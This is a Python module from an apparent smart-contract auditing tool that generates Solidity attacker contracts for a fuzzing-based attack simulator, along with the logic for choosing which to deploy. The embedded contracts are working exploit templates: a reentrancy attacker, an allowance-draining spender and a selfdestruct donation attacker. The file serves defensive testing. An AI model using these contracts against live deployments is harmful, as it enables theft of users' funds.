"""Malicious-contract generators for the attack simulator (Phase 1 upgrade).

The old simulator could only make simple moneyless calls from plain
accounts, which is why reentrancy, approval drains, and donation attacks
were structurally invisible to it. This module generates the *attacker*
side of the equation as plain Solidity sources: they are written into the
Foundry test project, deployed by the attack handler, and driven through
it — so exploits run through a real malicious contract, not a direct call.

All generation here is deterministic string building (no LLM, no
network), which keeps it unit-testable without forge.
"""

from __future__ import annotations

from dataclasses import dataclass

from web3guard.invariants.models import FunctionSig, Invariant

#: Function-name aliases the harness recognizes as "put money in".
_DEPOSIT_ALIASES = ("deposit", "stake", "mint", "supply", "fund", "addliquidity")
#: Function-name aliases the harness recognizes as "take money out".
_WITHDRAW_ALIASES = (
    "withdraw",
    "withdrawto",
    "unstake",
    "burn",
    "redeem",
    "claim",
    "exit",
    "cashout",
)

#: Withdraw parameter shapes the reentrancy attacker can drive.
_WITHDRAW_SHAPE_AMOUNT = "amount"  # withdraw(uint256)
_WITHDRAW_SHAPE_NOARG = "noarg"  # bare withdraw()
_WITHDRAW_SHAPE_TO = "to"  # withdrawTo(address)

#: Invariant ids rendered by Web3Guard's own harness code (the attack and
#: ghost harnesses), as opposed to caller-supplied or LLM-drafted rules.
#: They are deterministic product logic — a forge break of one of them is a
#: machine-checked exploit demonstration, attributable by construction. The
#: proof gate's attribution requirement exists to block hallucinated rules
#: from becoming findings; it must not silence the harness's own exploit
#: demonstrations (that would make the reentrancy-attacker feature
#: unreachable through the product pipeline for every vault shape).
HARNESS_RENDERED_INVARIANT_IDS = frozenset({"attacker_no_profit"})

#: Source markers for share-price / share-mint mechanics (Fix B). When any
#: of these appear, a forced ETH donation is a legitimate test: the real
#: ERC-4626 donation-inflation bug class works exactly by force-feeding
#: value to move the share price. Without share mechanics, a donation can
#: only break naive ``deposits == balance`` equalities — a false positive,
#: not a bug.
_SHARE_MECHANICS_RES = (
    r"\btotalShares\b",
    r"\bsharePrice\b",
    r"\bpricePerShare\b",
    r"\bconvertTo(?:Shares|Assets)\b",
    r"\bpreview(?:Deposit|Mint|Withdraw|Redeem)\b",
    r"\bgetRate\b",
    r"\bexchangeRate\b",
    r"\bERC4626\b",
    r"\bvirtual(?:Shares|Assets|Offset)\b",
)


@dataclass
class ReenterVariant:
    """One withdraw-like entry the reentrancy attacker can drive.

    Cross-function reentrancy hides behind sibling entries (a guarded
    ``withdraw()`` next to an unguarded ``withdrawVested()``), so every
    withdraw-like function becomes its own re-entry variant, paired with
    the deposit-like function that funds the balance it reads.
    """

    withdraw_fn: str  # e.g. "withdrawVested"
    withdraw_shape: str  # "amount" | "noarg" | "to"
    withdraw_sig: str  # canonical, e.g. "withdrawVested()"
    deposit_fn: str  # payable no-arg deposit funding this variant


@dataclass
class VaultInterface:
    """A detected (deposit, withdraw) pair the reentrancy attacker can use.

    Supported withdraw shapes: ``withdraw(uint256)`` ("amount"), bare
    ``withdraw()`` ("noarg"), and ``withdrawTo(address)`` ("to"). Every
    withdraw-like function on the target becomes a re-entry variant in
    :attr:`variants` (the primary pair is ``variants[0]``); anything
    fancier (multi-param withdraws, share-based flows, withdraws with no
    payable no-arg deposit behind them) is skipped with an honest note in
    :attr:`skipped` instead of a broken attacker.
    """

    deposit_fn: str  # e.g. "deposit"
    deposit_sig: str  # e.g. "deposit()"
    withdraw_fn: str  # e.g. "withdraw"
    withdraw_sig: str  # e.g. "withdraw(uint256)"
    withdraw_shape: str  # "amount" | "noarg" | "to"
    variants: tuple[ReenterVariant, ...] = ()
    skipped: tuple[str, ...] = ()


@dataclass
class AttackerSpec:
    """One malicious contract to deploy inside the fuzz project."""

    name: str  # contract name, e.g. "ReentrancyAttacker"
    filename: str  # e.g. "test/attackers/ReentrancyAttacker.sol"
    source: str  # full Solidity source
    purpose: str  # plain-language note for reports/logs


def _matches_alias(name: str, aliases: tuple[str, ...]) -> bool:
    """True for an exact alias or a verb-prefixed extension of one.

    ``withdrawVested`` / ``depositVested`` (cross-function reentrancy
    fixtures) and ``depositETH`` match via the prefix; unrelated names do
    not. The profit-gated invariant keeps over-matching honest: deploying
    the attacker is never itself a finding.
    """
    lname = name.lower()
    return lname in aliases or lname.startswith(aliases)


def _verb_suffix(name: str) -> str:
    """The part of a deposit/withdraw name after the verb.

    Used to pair a withdraw-like function with the deposit-like function
    that funds the balance it reads: ``withdrawVested`` <->>
    ``depositVested`` (suffix ``"vested"``), ``withdraw`` <-> ``deposit``
    (suffix ``""``).
    """
    lname = name.lower()
    for verb in sorted(_DEPOSIT_ALIASES + _WITHDRAW_ALIASES, key=len, reverse=True):
        if lname.startswith(verb) and len(lname) > len(verb):
            return lname[len(verb):]
    return ""


def _canonical_type(tp: str) -> str:
    """ABI-canonical form of a parameter type for encodeWithSignature."""
    tp = tp.replace(" payable", "").strip()
    return {"uint": "uint256", "int": "int256"}.get(tp, tp)


def _withdraw_shape(fn: FunctionSig) -> str | None:
    """Classify a withdraw-like function into a drivable shape (or None)."""
    if not fn.state_changing:
        return None
    if not _matches_alias(fn.name, _WITHDRAW_ALIASES):
        return None
    if len(fn.params) == 0:
        return _WITHDRAW_SHAPE_NOARG
    if len(fn.params) == 1:
        ptype = fn.params[0][0]
        if ptype.startswith("uint"):
            return _WITHDRAW_SHAPE_AMOUNT
        if ptype.startswith("address"):
            return _WITHDRAW_SHAPE_TO
    return None


def _is_deposit_fn(fn: FunctionSig) -> bool:
    return fn.state_changing and _matches_alias(fn.name, _DEPOSIT_ALIASES)


def _paired_deposit(
    wfn: FunctionSig,
    deposits: list[FunctionSig],
    primary: FunctionSig,
) -> FunctionSig | None:
    """The payable no-arg deposit funding the balance ``wfn`` reads.

    Prefers the deposit-like function whose name shares ``wfn``'s verb
    suffix (``depositVested`` for ``withdrawVested``); falls back to the
    primary deposit. Returns None when no candidate is a payable no-arg
    function — the variant is then skipped, not mis-driven.
    """
    suffix = _verb_suffix(wfn.name)
    for dep in deposits:
        if (
            _verb_suffix(dep.name) == suffix
            and dep.mutability == "payable"
            and not dep.params
        ):
            return dep
    if primary.mutability == "payable" and not primary.params:
        return primary
    return None


def detect_vault_interface(functions: list[FunctionSig]) -> VaultInterface | None:
    """Find a (deposit, withdraw) pair usable by the reentrancy attacker.

    Every withdraw-like function becomes a re-entry variant (see
    :class:`ReenterVariant`); the primary pair is ``variants[0]``.
    """
    deposits = [fn for fn in functions if _is_deposit_fn(fn)]
    if not deposits:
        return None
    primary_dep = deposits[0]
    variants: list[ReenterVariant] = []
    skipped: list[str] = []
    for fn in functions:
        shape = _withdraw_shape(fn)
        if shape is None:
            continue
        dep = _paired_deposit(fn, deposits, primary_dep)
        if dep is None:
            skipped.append(
                f"{fn.name}: no payable no-arg deposit-like function funds "
                "its balance — re-entry variant skipped"
            )
            continue
        sig_types = ",".join(_canonical_type(t) for t, _ in fn.params)
        variants.append(
            ReenterVariant(
                withdraw_fn=fn.name,
                withdraw_shape=shape,
                withdraw_sig=f"{fn.name}({sig_types})",
                deposit_fn=dep.name,
            )
        )
    if not variants:
        return None
    v0 = variants[0]
    dep_types = ",".join(t for t, _ in primary_dep.params)
    return VaultInterface(
        deposit_fn=primary_dep.name,
        deposit_sig=f"{primary_dep.name}({dep_types})",
        withdraw_fn=v0.withdraw_fn,
        withdraw_sig=v0.withdraw_sig,
        withdraw_shape=v0.withdraw_shape,
        variants=tuple(variants),
        skipped=tuple(skipped),
    )


def reentrancy_attacker_source(pragma: str = "pragma solidity ^0.8.20;") -> str:
    """A generic reentrancy attacker driven entirely by the handler.

    The handler deposits into the target *as* this contract, then triggers
    a withdrawal *as* this contract; ``receive()`` re-enters the target
    mid-call with harness-supplied calldata. Re-entry failures are
    swallowed on purpose: on a SAFE target the reentrant call reverts and
    the outer flow continues normally; on a VULNERABLE target it succeeds
    and the theft shows up as attacker profit.
    """
    return f"""// SPDX-License-Identifier: MIT
{pragma}

// Web3Guard-generated reentrancy attacker (attack simulator, Phase 1).
// Driven by the AttackHandler: arm() loads the target + the exact
// calldata to re-enter with, then the handler deposits and withdraws
// AS this contract so receive() fires mid-call.
contract ReentrancyAttacker {{
    address public target;
    bytes public reenterCalldata;
    uint256 public maxReentries = 3;
    uint256 public reentries;
    bool public armed;

    function arm(
        address _target,
        bytes calldata _reenterCalldata,
        uint256 _maxReentries
    ) external {{
        target = _target;
        reenterCalldata = _reenterCalldata;
        maxReentries = _maxReentries;
        reentries = 0;
        armed = true;
    }}

    function disarm() external {{
        armed = false;
    }}

    receive() external payable {{
        if (!armed || reentries >= maxReentries) return;
        reentries += 1;
        // Deliberately swallow failure: a safe target reverts here and
        // the outer flow continues; a vulnerable target lets us back in.
        (bool ok, ) = target.call(reenterCalldata);
        ok;
    }}
}}
"""


def approval_drainer_source(pragma: str = "pragma solidity ^0.8.20;") -> str:
    """A spender contract that drains whatever allowance a victim granted."""
    return f"""// SPDX-License-Identifier: MIT
{pragma}

// Web3Guard-generated approval-draining spender (attack simulator, Phase 1).
// The handler tricks (or fuzzes) a victim into approving this contract,
// then drain() pulls the tokens via transferFrom.
interface IWgERC20 {{
    function transferFrom(address from, address to, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}}

contract ApprovalDrainer {{
    function drain(address token, address victim, uint256 amount) external {{
        uint256 allowed = IWgERC20(token).allowance(victim, address(this));
        uint256 amt = amount > allowed ? allowed : amount;
        if (amt > 0) {{
            IWgERC20(token).transferFrom(victim, address(this), amt);
        }}
    }}

    receive() external payable {{}}
}}
"""


def donation_attacker_source(pragma: str = "pragma solidity ^0.8.20;") -> str:
    """Force-feeds ETH via selfdestruct, bypassing receive()/fallback.

    The classic share-price / accounting donation: raw ETH appears in the
    target without going through any deposit function, so any invariant of
    the form ``balance == deposits - withdrawals`` breaks.
    """
    return f"""// SPDX-License-Identifier: MIT
{pragma}

// Web3Guard-generated donation attacker (attack simulator, Phase 1).
// donate() selfdestructs the held ETH into the target, which bypasses
// receive()/fallback entirely (EIP-6780 keeps the code, the ETH moves).
contract DonationAttacker {{
    receive() external payable {{}}

    function donate(address payable target) external {{
        selfdestruct(target);
    }}
}}
"""


def select_attackers(
    pragma: str,
    functions: list[FunctionSig],
) -> tuple[list[AttackerSpec], list[str]]:
    """Choose which attacker contracts to deploy for this target.

    Returns (specs, notes). Always includes the donation attacker (it is
    fully generic); adds the reentrancy attacker when a vault-like
    (deposit, withdraw) pair is detected, and the approval drainer when
    the target looks token-ish (approve/permit or transferFrom present).
    """
    specs: list[AttackerSpec] = []
    notes: list[str] = []

    specs.append(
        AttackerSpec(
            name="DonationAttacker",
            filename="test/attackers/DonationAttacker.sol",
            source=donation_attacker_source(pragma),
            purpose=(
                "force-feeds ETH via selfdestruct to break naive "
                "balance == deposits - withdrawals accounting"
            ),
        )
    )

    vault = detect_vault_interface(functions)
    if vault is not None:
        specs.append(
            AttackerSpec(
                name="ReentrancyAttacker",
                filename="test/attackers/ReentrancyAttacker.sol",
                source=reentrancy_attacker_source(pragma),
                purpose=(
                    f"re-enters {vault.withdraw_sig} mid-call to drain "
                    f"funds deposited via {vault.deposit_sig}"
                ),
            )
        )
        for s in vault.skipped:
            notes.append(f"reentrancy variant skipped: {s}")
    else:
        notes.append(
            "no (deposit, withdraw) pair detected: reentrancy attacker not deployed for this target"
        )

    names = {fn.name.lower() for fn in functions}
    if names & {"approve", "permit", "transferfrom", "increaseallowance"}:
        specs.append(
            AttackerSpec(
                name="ApprovalDrainer",
                filename="test/attackers/ApprovalDrainer.sol",
                source=approval_drainer_source(pragma),
                purpose=("drains token allowances victims granted to it via transferFrom"),
            )
        )
    else:
        notes.append(
            "no approve/permit/transferFrom interface: approval-draining "
            "spender not deployed for this target"
        )
    return specs, notes


def has_share_mechanics(source: str) -> bool:
    """True when the target has share-price/mint mechanics.

    Only then is a forced ETH donation a legitimate test (the ERC-4626 /
    share-inflation bug class). Pure string matching over the source —
    deterministic, no toolchain needed.
    """
    import re as _re

    return any(_re.search(pat, source) for pat in _SHARE_MECHANICS_RES)


def exact_equality_invariants(
    invariants: list[Invariant],
) -> list[Invariant]:
    """Invariants asserting an exact accounting equality.

    Template invariants are classified by their spec
    (``TemplateSpec.accounting_class``); sharp/LLM-drafted rules go through
    the assertion-shape heuristic. A forced donation breaks these by
    construction, so they are what the donation-attacker scoping keys on.
    """
    from web3guard.invariants.templates import (
        is_exact_equality_accounting as _heuristic,
    )
    from web3guard.invariants.templates import (
        template_accounting_class as _class_of,
    )

    out: list[Invariant] = []
    for inv in invariants:
        if _class_of(inv.id) == "exact-equality":
            out.append(inv)
        elif _class_of(inv.id) == "agnostic" and _heuristic(inv):
            # Unknown (non-template) id + the exact-equality assertion
            # shape: a sharp/LLM rule of the donation-sensitive kind.
            out.append(inv)
    return out


def should_deploy_donation_attacker(
    source: str,
    invariants: list[Invariant],
) -> tuple[bool, str]:
    """Decide whether the donation attacker may fire in this campaign.

    Returns (deploy, reason). The donation attacker is stood down when the
    campaign's invariants assert exact accounting equality AND the target
    has no share-price/mint mechanics that forced donations could
    legitimately break — there a donation can only manufacture false
    positives (the batch_01 n1/n2/n9 shape). Everywhere else (share
    mechanics present, or no exact-equality invariant) it stays fully
    active, so the ERC-4626 donation-inflation class keeps working.
    """
    exact = exact_equality_invariants(invariants)
    if not exact:
        return True, (
            "donation attacker ACTIVE: no invariant asserts exact "
            "accounting equality"
        )
    if has_share_mechanics(source):
        return True, (
            "donation attacker ACTIVE: exact-equality invariant(s) "
            + ", ".join(f"'{inv.id}'" for inv in exact)
            + " present but the target has share-price/mint mechanics, "
            "so forced donations are a legitimate test "
            "(ERC-4626 inflation class)"
        )
    return False, (
        "donation attacker STOOD DOWN (Fix B): invariant(s) "
        + ", ".join(f"'{inv.id}'" for inv in exact)
        + " assert exact accounting equality and the target has no "
        "share-price/mint mechanics — a forced donation would only "
        "manufacture a false positive here"
    )
